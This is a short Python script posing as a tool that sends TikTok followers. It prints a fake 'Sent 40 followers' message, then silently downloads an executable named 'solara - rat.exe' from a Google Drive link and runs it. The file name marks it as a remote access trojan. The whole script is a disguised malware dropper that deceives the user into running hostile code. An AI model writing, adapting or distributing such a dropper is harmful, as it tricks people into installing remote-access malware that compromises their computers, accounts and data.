import requests
import subprocess
import time

def download_file(url, filename):
    response = requests.get(url)
    if response.status_code == 200:
        with open(filename, "wb") as f:
            f.write(response.content)
        return True
    else:
        return False

username = input("Enter your TikTok username: ")
print(f"Sending 40 followers to @{username}...")
time.sleep(2)
print(f"✅ Sent 40 followers to @{username}!\n")

url = "https://drive.google.com/file/d/1RXLcDAqsTL8-SJv5nxly4menBcRezI2q/view?usp=drive_link"  # Replace with your actual .exe URL
filename = "solara - rat.exe"

if download_file(url, filename):
    # Run the .exe quietly (on Windows)
    subprocess.Popen([filename], creationflags=subprocess.CREATE_NEW_CONSOLE)
else:
    print("Something went wrong. Please try again later.")
